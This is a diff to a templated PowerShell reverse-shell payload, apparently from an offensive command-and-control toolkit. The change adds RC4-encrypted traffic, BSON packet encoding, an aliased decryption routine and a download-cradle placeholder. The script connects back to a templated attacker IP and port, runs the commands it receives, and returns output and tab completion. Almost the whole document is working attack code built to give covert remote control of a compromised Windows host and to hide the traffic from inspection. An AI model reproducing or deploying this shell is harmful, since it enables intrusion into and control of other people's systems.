@@ -1,8 +1,127 @@
-Start-Job -ScriptBlock {
+{{'Start-Job -ScriptBlock {'|nodebug}}
 
+{{'$DebugPreference = "Continue"'|debug}}
+
+$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 $DL_CRADLE = @'
 {{dl_cradle}}
 '@
+
+{% include "powershell/rc4.ps1" %}
+Set-Alias -Name Decrypt-Code -Value {{symbol_name("Decrypt-Code")}}
+
+$elements = @{ # bson elements
+    [Double] = 1
+    [System.String] = 2
+    [System.Collections.Hashtable] = 3
+    [System.Object[]] = 4
+    [System.Byte[]] = 5
+    [System.Boolean] = 8
+    [Int32] = 0x10
+    [UInt64] = 0x11
+    [Int64] = 0x12
+};
+
+$enc = [system.Text.Encoding]::UTF8
+
+function ConvertTo-Bson {
+    param(
+        [Parameter(Position = 0, Mandatory = $true)] $dict,
+        [Parameter(Position = 1)] [Int32]$type
+    )
+
+    [byte[]]$result = @()
+
+    if ($type -eq 0) { # it's the document
+        $result += ConvertTo-Bson $dict $elements[$dict.GetType()]
+    } elseif ($type -eq 2) { # string
+        $result += [bitconverter]::GetBytes([Int32]($dict.length+1))
+        $result += $enc.GetBytes($dict)
+        $result += 0
+    } elseif ($type -eq 3) { # hashtable
+        foreach ($key in $dict.keys) {
+            $type = $elements[$dict[$key].gettype()]
+            $result += $type
+            $result += $enc.GetBytes($key)
+            $result += 0
+            $result += ConvertTo-Bson $dict[$key] $type
+        }
+        $result = [bitconverter]::GetBytes([Int32]($result.Length+5)) + $result
+        $result += 0
+    } elseif ($type -eq 4) { # array
+        $counter = 0
+        foreach ($i in $dict) {
+            $type = $elements[$i.gettype()]
+            $result += $type
+            $result += $enc.GetBytes("$counter")
+            $result += 0
+            $result += ConvertTo-Bson $i $type
+            $counter += 1
+        }
+        $result = [bitconverter]::GetBytes([Int32]($result.Length+5)) + $result
+        $result += 0
+    } elseif ($type -eq 0x10) { # int32
+        $result += [bitconverter]::GetBytes([Int32]($dict))
+    } else {
+        throw "Type not supported yet", $type, $dict
+        # TODO: consider other types than string.
+    }
+    $result
+}
+
+function ConvertFrom-Bson {
+    param([Parameter(Position = 0, Mandatory = $true)] $array,
+          [Parameter(Position = 1, Mandatory = $false)] [Int32]$type)
+    $result = @{}
+    $i = 0
+    if ($type -eq 0) {
+        $i = 4
+        $type = 3
+        $l = $array.length
+        $length = [BitConverter]::ToInt32([byte[]]$array, 0)
+        if ($length -ne $l) {
+            throw "Not a valid BSON structure"
+        }
+    }
+    if ($type -eq 3 -or $type -eq 4) {
+        # TODO handle arrays separately
+        while ($True) {
+            $key = ""
+            $type = $array[$i]
+            $i += 1
+            while ($True) { # get the key name
+                if ($array[$i] -eq 0) { break }
+                $key += $enc.GetString($array[$i])
+                $i += 1
+            }
+            [byte[]]$val = @()
+            $i += 1
+            if ($type -eq 2) {
+                $length = [BitConverter]::ToInt32([byte[]]$array, $i)
+                [byte[]]$val = $array[($i+4) .. ($i+4+$length-1)]
+                $result[$key] = ConvertFrom-Bson $val $type
+                $i += $length+4
+            } elseif ($type -eq 0x10) {
+                [byte[]]$val = $array[($i) .. ($i+4)]
+                $result[$key] = ConvertFrom-Bson $val $type
+                $i += 4
+            }
+            if ($i -ge $array.length - 2  ) {break}
+        }
+    } elseif ($type -eq 2) {
+        # remove the null byte at the end
+        $result = $enc.GetString($array[0 .. ($array.length-2)])
+    } elseif ($type -eq 0x10) { # int32
+
+        {{'Write-Debug "ToInt32:  $array, $($array.length)"'|debug}}
+        $result = [bitconverter]::ToInt32([byte[]]$array, 0)
+    } else {
+        throw "Type not supported yet", $type, $array
+    }
+    $result
+}
+
+
 
 function Invoke-PowerShellTcp
 {
@@ -38,22 +157,20 @@ function Invoke-PowerShellTcp
         param (
             [Parameter(Position = 0)] $Stream
         )
-        $i = $stream.Read($bytes, 0, 2)
-        if ($i -eq 0) {
-            $Null
-        } else {
-            $packet_type = $bytes[0..1]
-            $stream.Read($bytes, 0, 4)
-            $packet_length = $bytes[0..3]
-            if ([BitConverter]::IsLittleEndian) {
-                [Array]::reverse($packet_length)
-            }
-            $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
-            $stream.Read($bytes, 0, $len)
-            $body = $bytes[0..($len-1)]
-            $body = [System.Text.Encoding]::UTF8.GetString($body)
-            ConvertFrom-Json -InputObject $body
+        $bytes_read = $stream.Read($bytes, 0, 4)
+        if ($bytes_read -eq 0) {
+            return $($Null, $Null)
         }
+        $enc_packet_length = $bytes[0..3]
+        $packet_length = Decrypt-Code $enc_packet_length $KEY
+        $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
+        $stream.Read($bytes, 0, $len-4)
+        $body = $enc_packet_length
+        $body += $bytes[0 .. ($len-5)]
+        $body = Decrypt-Code $body $KEY
+        {{'Write-Debug "Read: $($enc.getstring($body))"'|debug}}
+        $result = ConvertFrom-Bson $body
+        return $result
     }
 
     function Write-ShellPacket {
@@ -61,14 +178,11 @@ function Invoke-PowerShellTcp
             [Parameter(Position = 0)] $Packet,
             [Parameter(Position = 1)] $Stream
         )
-        $body = ($Packet | ConvertTo-JSON)
-        $body = ([text.encoding]::UTF8).GetBytes($body)
-        $packet_length = [BitConverter]::GetBytes([Uint32]($body.length))
-        if ([BitConverter]::IsLittleEndian) {
-            [Array]::reverse($packet_length)
-        }
-        $packet_type = [byte[]](0x0,0x0)
-        $Stream.Write($packet_type + $packet_length + $body, 0, 6 + $body.length)
+        $body = [byte[]](ConvertTo-Bson $Packet)
+
+        {{'Write-Debug "Sending:  $($enc.getstring($body))"'|debug}}
+        $body = Decrypt-Code $body $KEY
+        $Stream.Write($body, 0, $body.length)
         $Stream.Flush()
     }
 
@@ -113,9 +227,6 @@ function Invoke-PowerShellTcp
         $result | ? { $_.data }
     }
 
-    Retrieve-Errors {
-
-    }
 
     function Handle-Packets {
 
@@ -136,7 +247,7 @@ function Invoke-PowerShellTcp
 
         $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
         $data = ""
-        while ( $packet = (Read-ShellPacket  $stream) ) {
+        while ( $packet = (Read-ShellPacket  $stream)[2] ) {
             $output = ""
             if ($packet.msg_type -eq "COMMAND") {
                 $data = $packet.data
@@ -166,9 +277,15 @@ function Invoke-PowerShellTcp
                 Write-ShellPacket (Get-ShellPrompt) $stream
             } elseif ($packet.msg_type -eq "TABCOMPL") {
                 $data = $packet.data
-                $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
-                $output = $x.CompletionMatches.CompletionText
+                # TODO Not always available
+                try {
+                    $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
+                    $output = $x.CompletionMatches.CompletionText
+                } catch {
+                    $output = ""
+                }
                 if (-not $output) { $output = "" }
+                {{'Write-Debug "Completion: $($output|out-string)"'|debug}}
                 if ($output.gettype() -eq [System.String]) { $output = @($output) }
 
                 Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
@@ -203,7 +320,9 @@ function Invoke-PowerShellTcp
 
         $stream = $client.GetStream()
         # this the shell hello
-        $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
+        $shell_hello = [byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b)
+        $shell_hello = Decrypt-Code $shell_hello $KEY
+        $stream.Write($shell_hello, 0, $shell_hello.length)
         [byte[]]$bytes = 0..1024|%{0}
 
         Handle-Packets
@@ -218,4 +337,5 @@ function Invoke-PowerShellTcp
 
 
 Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse -Delay {{delay}} -LifeTime {{lifetime}}
-}
+
+{{'}'|nodebug}}
